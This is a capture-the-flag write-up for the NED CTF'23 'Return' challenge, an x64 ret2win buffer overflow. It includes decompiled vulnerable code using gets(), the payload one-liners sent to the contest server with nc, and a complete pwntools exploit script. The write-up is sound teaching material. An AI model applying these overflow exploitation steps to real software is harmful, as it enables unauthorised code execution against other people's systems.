---
title: NED CTF'23 - Pwn - Return
date: '2023-07-03'
tags: ['ctf', 'pwn', 'nedctf', 'writeup', 'buffer-overflow', 'x64', 'ret2win']
draft: false
summary: A simple x64 ret2win challenge.
---

## Challenge Description

Navigate the maze of memory and claim your prize.

Author: [Saad Akhtar](https://twitter.com/ssaadakhtarr)

```bash
nc 159.223.192.150 9002
```

![chal-info](/static/writeups/nedctf/pwn/return0.png)

## Solution

Downloading the `return.zip`, we get the following files

![files](/static/writeups/nedctf/pwn/return1.png)

The `file` security checks on the binary are as follows

![file](/static/writeups/nedctf/pwn/return4.png)

Let's run the `return` binary to check what it does

![run](/static/writeups/nedctf/pwn/return2.png)

Okay, let's disassemble and check the functions inside ghidra

![functions](/static/writeups/nedctf/pwn/return3.png)

The disassembled main function is as follows

```c
undefined8 main(void) {
  char local_108 [256];
  
  banner();
  printf("\n\n\nMay I ask what your name is? ");
  gets(local_108);
  printf("Good luck %s!\n",local_108);
  return 0;
}
```

Well, again `gets`, and this time the buffer is `256`. The other function that is of interest is `print_flag`

```c
void print_flag(void) {
  int iVar1;
  FILE *__stream;
  
  __stream = fopen("flag.txt","r");
  if (__stream == (FILE *)0x0) {
    puts("Error: could not open file.");
  }
  else {
    puts("Contents of flag.txt:");
    while( true ) {
      iVar1 = fgetc(__stream);
      if ((char)iVar1 == -1) break;
      putchar((int)(char)iVar1);
    }
    fclose(__stream);
  }
  return;
}
```

Now, this function simply opens the `flag.txt` file and prints it's contents. 

### Exploitation

So, we have a buffer overflow vulnerability, and we have a function that prints the flag. We can simply overwrite the return address of the `main` function with the address of `print_flag` function. Let's check the address of `print_flag` function. For that, we'll use my [script](https://gist.github.com/TheFlash2k/198bb805b3591e27b9bf9fc17bee4c4a)

![gadgets](/static/writeups/nedctf/pwn/return6.png)

In x64, we also need to provide a `ret` gadget to ensure that the program doesn't crash. Let's check the `ret` gadget address as well. We will use [ropper](https://github.com/sashs/Ropper) for that

```bash
ropper -f return --search "ret"
```

![gadgets](/static/writeups/nedctf/pwn/return5.png)

Now, since we have both values, we can craft a simple payload, which will be as follows

```md
[padding] + [ret gadget] + [print_flag address]
```

The padding will be `256` bytes to fully-fill the buffer, the ret gadget will be next to accumlate the buffer till RIP overwrite so that the function returns successfully and the print_flag address will be stored on the RIP. Let's craft the payload. But first, we'll `p64` the value of ret gadget:

```bash
$ python3 -c 'import pwn; print(pwn.p64(0x000000000040101a))'
b'\x1a\x10@\x00\x00\x00\x00\x00'
```

So, the payload now becomes:

```bash
python -c 'print "A" * 256 + "\x1a\x10@\x00\x00\x00\x00\x00" + "\xf6\x11@\x00\x00\x00\x00\x00"' | ./return
```

![flag](/static/writeups/nedctf/pwn/return7.png)

We can see that we got the flag, let's pipe the output to `nc` to get the flag remotely

```bash
python -c 'print "A" * 256 + "\x1a\x10@\x00\x00\x00\x00\x00" + "\xf6\x11@\x00\x00\x00\x00\x00"' | nc 159.223.192.150 9002
```

![flag](/static/writeups/nedctf/pwn/return8.png)

We got the flag!

```md
Flag: NCC{r3t_2_w1ns_4r3_fuN}
```

Now, let's a write a simple `exploit.py` for this

```python:exploit.py
#!/usr/bin/env python3

from pwn import *
import sys
import re

_bin = "./return"
elf = context.binary = ELF(_bin)
rop = ROP(elf)

if len(sys.argv) == 2 and sys.argv[1].lower() == "remote":
	io = remote('159.223.192.150', 9002)
else:
	io = process(_bin)

io.recv()

payload = flat(
	[
		b"A" * 256,
		rop.ret.address,
		elf.sym.print_flag,
		b"\n"
	]
)

io.sendline(payload)
buf = io.recv().decode('latin-1')
print(buf)
```

![flag](/static/writeups/nedctf/pwn/return9.png)
